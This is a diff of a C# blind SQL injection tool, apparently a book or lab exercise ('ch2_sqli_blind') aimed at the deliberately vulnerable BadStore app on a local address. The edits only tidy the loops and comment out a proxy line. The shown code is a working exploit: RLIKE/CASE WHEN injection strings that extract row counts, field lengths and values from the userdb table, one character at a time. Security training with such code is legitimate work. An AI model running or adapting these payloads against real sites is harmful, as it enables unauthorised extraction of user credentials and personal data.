@@ -19,15 +19,13 @@ namespace ch2_sqli_blind
 			};
 
 			int countLength = 0;
-			for (int i = 0;;i++) {
-				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM badstoredb.userdb)>"+i+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
+			for (;;countLength++) {
+				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM badstoredb.userdb)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
 
 				string response = MakeRequest (getCountLength);
 
 				if (response.Contains ("parentheses not balanced"))
 					break;
-
-				countLength++;
 			}
 
 			List<byte> countBytes = new List<byte> ();
@@ -55,6 +53,7 @@ namespace ch2_sqli_blind
 
 					Console.Write ("Getting value... ");
 					string value = GetValue (row, column, valLength);
+
 					Console.WriteLine (value);
 				}
 			}
@@ -62,15 +61,13 @@ namespace ch2_sqli_blind
 
 		private static int GetLength(int row, string column) {
 			int countLength = 0;
-			for (int i = 0;; i++) {
-				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH("+column+") AS CHAR),0x20)) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1)>"+i+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
+			for (;; countLength++) {
+				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH("+column+") AS CHAR),0x20)) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
 
 				string response = MakeRequest (getCountLength);
 
 				if (response.Contains ("parentheses not balanced"))
 					break;
-
-				countLength++;
 			}
 
 			List<byte> countBytes = new List<byte> ();
@@ -86,7 +83,7 @@ namespace ch2_sqli_blind
 				}
 			}
 
-			return int.Parse (Encoding.ASCII.GetString (countBytes.ToArray ()));;
+			return int.Parse (Encoding.ASCII.GetString (countBytes.ToArray ()));
 		}
 
 		private static string GetValue(int row, string column, int length) {
@@ -107,7 +104,7 @@ namespace ch2_sqli_blind
 
 		private static string MakeRequest(string url) {
 			HttpWebRequest request = (HttpWebRequest)WebRequest.Create ("http://192.168.1.78/cgi-bin/badstore.cgi?action=search&searchquery="+url);
-			request.Proxy = new WebProxy ("127.0.0.1", 8080);
+			//request.Proxy = new WebProxy ("127.0.0.1", 8080);
 
 			string response = string.Empty;
 			using (StreamReader reader = new StreamReader (request.GetResponse ().GetResponseStream ()))
